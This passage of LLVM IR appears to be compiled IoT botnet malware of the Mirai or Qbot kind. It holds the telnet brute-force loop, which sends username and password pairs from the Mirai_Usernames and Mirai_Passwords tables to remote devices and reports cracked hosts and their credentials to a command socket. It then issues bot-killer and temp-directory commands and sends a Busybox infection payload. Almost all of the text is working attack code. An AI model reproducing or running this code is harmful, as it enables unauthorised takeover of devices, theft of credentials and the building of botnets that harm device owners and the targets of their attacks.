  %274 = call i32 @select(i32 %273, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %274, i32* %7, align 4
  %275 = load i32, i32* %7, align 4
  %276 = icmp eq i32 %275, 1
  br i1 %276, label %277, label %315

; <label>:277:                                    ; preds = %244
  %278 = call i64 @time(i64* null) #5
  %279 = trunc i64 %278 to i32
  %280 = load i32, i32* %6, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 7
  store i32 %279, i32* %283, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %284 = load i32, i32* %6, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = bitcast i32* %15 to i8*
  %290 = call i32 @getsockopt(i32 %288, i32 1, i32 4, i8* %289, i32* %14) #5
  %291 = load i32, i32* %15, align 4
  %292 = icmp ne i32 %291, 0
  br i1 %292, label %293, label %297

; <label>:293:                                    ; preds = %277
  %294 = load i32, i32* %6, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %295
  call void @reset_telstate(%struct.telstate_t* %296)
  br label %314

; <label>:297:                                    ; preds = %277
  %298 = load i32, i32* %6, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 16
  %303 = load i32, i32* %6, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = call i32 (i32, i32, ...) @fcntl(i32 %307, i32 3, i8* null)
  %309 = and i32 %308, -2049
  %310 = call i32 (i32, i32, ...) @fcntl(i32 %302, i32 4, i32 %309)
  %311 = load i32, i32* %6, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %312
  call void @advance_telstate(%struct.telstate_t* %313, i32 2)
  br label %314

; <label>:314:                                    ; preds = %297, %293
  br label %876

; <label>:315:                                    ; preds = %244
  %316 = load i32, i32* %7, align 4
  %317 = icmp eq i32 %316, -1
  br i1 %317, label %318, label %322

; <label>:318:                                    ; preds = %315
  %319 = load i32, i32* %6, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %320
  call void @reset_telstate(%struct.telstate_t* %321)
  br label %876

; <label>:322:                                    ; preds = %315
  br label %323

; <label>:323:                                    ; preds = %322
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 7
  %328 = load i32, i32* %327, align 16
  %329 = add i32 %328, 7
  %330 = zext i32 %329 to i64
  %331 = call i64 @time(i64* null) #5
  %332 = icmp slt i64 %330, %331
  br i1 %332, label %333, label %337

; <label>:333:                                    ; preds = %323
  %334 = load i32, i32* %6, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %335
  call void @reset_telstate(%struct.telstate_t* %336)
  br label %337

; <label>:337:                                    ; preds = %333, %323
  br label %875

; <label>:338:                                    ; preds = %90
  %339 = load i32, i32* %6, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 16
  %344 = load i32, i32* %3, align 4
  %345 = load i32, i32* %6, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 9
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @read_until_response(i32 %343, i32 %344, i8* %349, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %352, label %375

; <label>:352:                                    ; preds = %338
  %353 = call i64 @time(i64* null) #5
  %354 = trunc i64 %353 to i32
  %355 = load i32, i32* %6, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 7
  store i32 %354, i32* %358, align 16
  %359 = load i32, i32* %6, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 9
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @contains_fail(i8* %363)
  %365 = icmp ne i32 %364, 0
  br i1 %365, label %366, label %370

; <label>:366:                                    ; preds = %352
  %367 = load i32, i32* %6, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %368
  call void @advance_telstate(%struct.telstate_t* %369, i32 0)
  br label %374

; <label>:370:                                    ; preds = %352
  %371 = load i32, i32* %6, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %372
  call void @advance_telstate(%struct.telstate_t* %373, i32 3)
  br label %374

; <label>:374:                                    ; preds = %370, %366
  br label %876

; <label>:375:                                    ; preds = %338
  %376 = load i32, i32* %6, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 7
  %380 = load i32, i32* %379, align 16
  %381 = add i32 %380, 7
  %382 = zext i32 %381 to i64
  %383 = call i64 @time(i64* null) #5
  %384 = icmp slt i64 %382, %383
  br i1 %384, label %385, label %389

; <label>:385:                                    ; preds = %375
  %386 = load i32, i32* %6, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %387
  call void @reset_telstate(%struct.telstate_t* %388)
  br label %389

; <label>:389:                                    ; preds = %385, %375
  br label %875

; <label>:390:                                    ; preds = %90
  %391 = load i32, i32* %6, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %392
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %393, i32 0, i32 0
  %395 = load i32, i32* %394, align 16
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 4
  %400 = load i8, i8* %399, align 2
  %401 = zext i8 %400 to i64
  %402 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %401
  %403 = load i8*, i8** %402, align 8
  %404 = load i32, i32* %6, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 4
  %408 = load i8, i8* %407, align 2
  %409 = zext i8 %408 to i64
  %410 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %409
  %411 = load i8*, i8** %410, align 8
  %412 = call i64 @strlen(i8* %411) #9
  %413 = call i64 @send(i32 %395, i8* %403, i64 %412, i32 16384)
  %414 = icmp slt i64 %413, 0
  br i1 %414, label %415, label %419

; <label>:415:                                    ; preds = %390
  %416 = load i32, i32* %6, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %417
  call void @reset_telstate(%struct.telstate_t* %418)
  br label %876

; <label>:419:                                    ; preds = %390
  %420 = load i32, i32* %6, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %421
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %422, i32 0, i32 0
  %424 = load i32, i32* %423, align 16
  %425 = call i64 @send(i32 %424, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %426 = icmp slt i64 %425, 0
  br i1 %426, label %427, label %431

; <label>:427:                                    ; preds = %419
  %428 = load i32, i32* %6, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %429
  call void @reset_telstate(%struct.telstate_t* %430)
  br label %876

; <label>:431:                                    ; preds = %419
  %432 = load i32, i32* %6, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %433
  call void @advance_telstate(%struct.telstate_t* %434, i32 4)
  br label %875

; <label>:435:                                    ; preds = %90
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 16
  %441 = load i32, i32* %3, align 4
  %442 = load i32, i32* %6, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %443
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %444, i32 0, i32 9
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @read_until_response(i32 %440, i32 %441, i8* %446, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %448 = icmp ne i32 %447, 0
  br i1 %448, label %449, label %472

; <label>:449:                                    ; preds = %435
  %450 = call i64 @time(i64* null) #5
  %451 = trunc i64 %450 to i32
  %452 = load i32, i32* %6, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %453
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %454, i32 0, i32 7
  store i32 %451, i32* %455, align 16
  %456 = load i32, i32* %6, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 9
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 @contains_fail(i8* %460)
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %463, label %467

; <label>:463:                                    ; preds = %449
  %464 = load i32, i32* %6, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %465
  call void @advance_telstate(%struct.telstate_t* %466, i32 0)
  br label %471

; <label>:467:                                    ; preds = %449
  %468 = load i32, i32* %6, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %469
  call void @advance_telstate(%struct.telstate_t* %470, i32 5)
  br label %471

; <label>:471:                                    ; preds = %467, %463
  br label %876

; <label>:472:                                    ; preds = %435
  %473 = load i32, i32* %6, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %474
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %475, i32 0, i32 7
  %477 = load i32, i32* %476, align 16
  %478 = add i32 %477, 7
  %479 = zext i32 %478 to i64
  %480 = call i64 @time(i64* null) #5
  %481 = icmp slt i64 %479, %480
  br i1 %481, label %482, label %486

; <label>:482:                                    ; preds = %472
  %483 = load i32, i32* %6, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %484
  call void @reset_telstate(%struct.telstate_t* %485)
  br label %486

; <label>:486:                                    ; preds = %482, %472
  br label %875

; <label>:487:                                    ; preds = %90
  %488 = load i32, i32* %6, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 16
  %493 = load i32, i32* %6, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 5
  %497 = load i8, i8* %496, align 1
  %498 = zext i8 %497 to i64
  %499 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %498
  %500 = load i8*, i8** %499, align 8
  %501 = load i32, i32* %6, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 5
  %505 = load i8, i8* %504, align 1
  %506 = zext i8 %505 to i64
  %507 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %506
  %508 = load i8*, i8** %507, align 8
  %509 = call i64 @strlen(i8* %508) #9
  %510 = call i64 @send(i32 %492, i8* %500, i64 %509, i32 16384)
  %511 = icmp slt i64 %510, 0
  br i1 %511, label %512, label %516

; <label>:512:                                    ; preds = %487
  %513 = load i32, i32* %6, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %514
  call void @reset_telstate(%struct.telstate_t* %515)
  br label %876

; <label>:516:                                    ; preds = %487
  %517 = load i32, i32* %6, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 0
  %521 = load i32, i32* %520, align 16
  %522 = call i64 @send(i32 %521, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %523 = icmp slt i64 %522, 0
  br i1 %523, label %524, label %528

; <label>:524:                                    ; preds = %516
  %525 = load i32, i32* %6, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %526
  call void @reset_telstate(%struct.telstate_t* %527)
  br label %876

; <label>:528:                                    ; preds = %516
  %529 = load i32, i32* %6, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %530
  call void @advance_telstate(%struct.telstate_t* %531, i32 6)
  br label %875

; <label>:532:                                    ; preds = %90
  %533 = load i32, i32* %6, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 16
  %538 = load i32, i32* %3, align 4
  %539 = load i32, i32* %6, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %540
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %541, i32 0, i32 9
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @read_until_response(i32 %537, i32 %538, i8* %543, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %545 = icmp ne i32 %544, 0
  br i1 %545, label %546, label %617

; <label>:546:                                    ; preds = %532
  %547 = call i64 @time(i64* null) #5
  %548 = trunc i64 %547 to i32
  %549 = load i32, i32* %6, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %550
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %551, i32 0, i32 7
  store i32 %548, i32* %552, align 16
  %553 = load i32, i32* %6, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 9
  %557 = load i8*, i8** %556, align 8
  %558 = call i32 @contains_fail(i8* %557)
  %559 = icmp ne i32 %558, 0
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %546
  %561 = load i32, i32* %6, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %562
  call void @advance_telstate(%struct.telstate_t* %563, i32 0)
  br label %616

; <label>:564:                                    ; preds = %546
  %565 = load i32, i32* %6, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 9
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @contains_success(i8* %569)
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %572, label %611

; <label>:572:                                    ; preds = %564
  %573 = load i32, i32* %6, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 3
  %577 = load i8, i8* %576, align 1
  %578 = zext i8 %577 to i32
  %579 = icmp eq i32 %578, 2
  br i1 %579, label %580, label %584

; <label>:580:                                    ; preds = %572
  %581 = load i32, i32* %6, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %582
  call void @advance_telstate(%struct.telstate_t* %583, i32 7)
  br label %610

; <label>:584:                                    ; preds = %572
  %585 = load i32, i32* @mainCommSock, align 4
  %586 = load i32, i32* %6, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %587
  %589 = call i8* @get_telstate_host(%struct.telstate_t* %588)
  %590 = load i32, i32* %6, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 4
  %594 = load i8, i8* %593, align 2
  %595 = zext i8 %594 to i64
  %596 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %595
  %597 = load i8*, i8** %596, align 8
  %598 = load i32, i32* %6, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 5
  %602 = load i8, i8* %601, align 1
  %603 = zext i8 %602 to i64
  %604 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %603
  %605 = load i8*, i8** %604, align 8
  %606 = call i32 (i32, i8*, ...) @sockprintf(i32 %585, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %589, i8* %597, i8* %605)
  %607 = load i32, i32* %6, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %608
  call void @advance_telstate(%struct.telstate_t* %609, i32 7)
  br label %610

; <label>:610:                                    ; preds = %584, %580
  br label %615

; <label>:611:                                    ; preds = %564
  %612 = load i32, i32* %6, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %613
  call void @reset_telstate(%struct.telstate_t* %614)
  br label %615

; <label>:615:                                    ; preds = %611, %610
  br label %616

; <label>:616:                                    ; preds = %615, %560
  br label %876

; <label>:617:                                    ; preds = %532
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 7
  %622 = load i32, i32* %621, align 16
  %623 = add i32 %622, 7
  %624 = zext i32 %623 to i64
  %625 = call i64 @time(i64* null) #5
  %626 = icmp slt i64 %624, %625
  br i1 %626, label %627, label %631

; <label>:627:                                    ; preds = %617
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %629
  call void @reset_telstate(%struct.telstate_t* %630)
  br label %631

; <label>:631:                                    ; preds = %627, %617
  br label %875

; <label>:632:                                    ; preds = %90
  %633 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %634 = call i32 (i8*, i8*, ...) @sprintf(i8* %633, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %635 = load i32, i32* %6, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 0
  %639 = load i32, i32* %638, align 16
  %640 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %641 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %642 = call i64 @strlen(i8* %641) #9
  %643 = call i64 @send(i32 %639, i8* %640, i64 %642, i32 16384)
  %644 = icmp slt i64 %643, 0
  br i1 %644, label %645, label %649

; <label>:645:                                    ; preds = %632
  %646 = load i32, i32* %6, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %647
  call void @reset_telstate(%struct.telstate_t* %648)
  br label %876

; <label>:649:                                    ; preds = %632
  call void @RemoveTempDirs()
  %650 = load i32, i32* @mainCommSock, align 4
  %651 = load i32, i32* %6, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %652
  %654 = call i8* @get_telstate_host(%struct.telstate_t* %653)
  %655 = load i32, i32* %6, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %656
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %657, i32 0, i32 4
  %659 = load i8, i8* %658, align 2
  %660 = zext i8 %659 to i64
  %661 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %660
  %662 = load i8*, i8** %661, align 8
  %663 = load i32, i32* %6, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 5
  %667 = load i8, i8* %666, align 1
  %668 = zext i8 %667 to i64
  %669 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %668
  %670 = load i8*, i8** %669, align 8
  %671 = call i32 (i32, i8*, ...) @sockprintf(i32 %650, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %654, i8* %662, i8* %670)
  %672 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* %672, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 16
  %679 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %680 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %681 = call i64 @strlen(i8* %680) #9
  %682 = call i64 @send(i32 %678, i8* %679, i64 %681, i32 16384)
  %683 = icmp slt i64 %682, 0
  br i1 %683, label %684, label %688

; <label>:684:                                    ; preds = %649
  %685 = load i32, i32* %6, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %686
  call void @reset_telstate(%struct.telstate_t* %687)
  br label %876

; <label>:688:                                    ; preds = %649
  %689 = load i32, i32* @mainCommSock, align 4
  %690 = load i32, i32* %6, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %691
  %693 = call i8* @get_telstate_host(%struct.telstate_t* %692)
  %694 = load i32, i32* %6, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 4
  %698 = load i8, i8* %697, align 2
  %699 = zext i8 %698 to i64
  %700 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %699
  %701 = load i8*, i8** %700, align 8
  %702 = load i32, i32* %6, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 5
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i64
  %708 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %707
  %709 = load i8*, i8** %708, align 8
  %710 = call i32 (i32, i8*, ...) @sockprintf(i32 %689, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %693, i8* %701, i8* %709)
  %711 = load i32, i32* %6, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %712
  call void @advance_telstate(%struct.telstate_t* %713, i32 8)
  br label %875

; <label>:714:                                    ; preds = %90
  %715 = call i64 @time(i64* null) #5
  %716 = trunc i64 %715 to i32
  %717 = load i32, i32* %6, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 7
  store i32 %716, i32* %720, align 16
  %721 = load i32, i32* %6, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 0
  %725 = load i32, i32* %724, align 16
  %726 = call i64 @send(i32 %725, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %727 = icmp slt i64 %726, 0
  br i1 %727, label %728, label %729

; <label>:728:                                    ; preds = %714
  br label %729

; <label>:729:                                    ; preds = %728, %714
  %730 = load i32, i32* %6, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 0
  %734 = load i32, i32* %733, align 16
  %735 = call i64 @send(i32 %734, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %736 = icmp slt i64 %735, 0
  br i1 %736, label %737, label %738

; <label>:737:                                    ; preds = %729
  br label %738

; <label>:738:                                    ; preds = %737, %729
  %739 = load i32, i32* %6, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = load i8*, i8** @Busybox_Payload, align 8
  %745 = load i8*, i8** @Busybox_Payload, align 8
  %746 = call i64 @strlen(i8* %745) #9
  %747 = call i64 @send(i32 %743, i8* %744, i64 %746, i32 16384)
  %748 = icmp slt i64 %747, 0
  br i1 %748, label %749, label %753

; <label>:749:                                    ; preds = %738
  %750 = load i32, i32* %6, align 4
  %751 = sext i32 %750 to i64
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %751
  call void @reset_telstate(%struct.telstate_t* %752)
  br label %876

; <label>:753:                                    ; preds = %738
  %754 = load i32, i32* @mainCommSock, align 4
  %755 = load i32, i32* %6, align 4
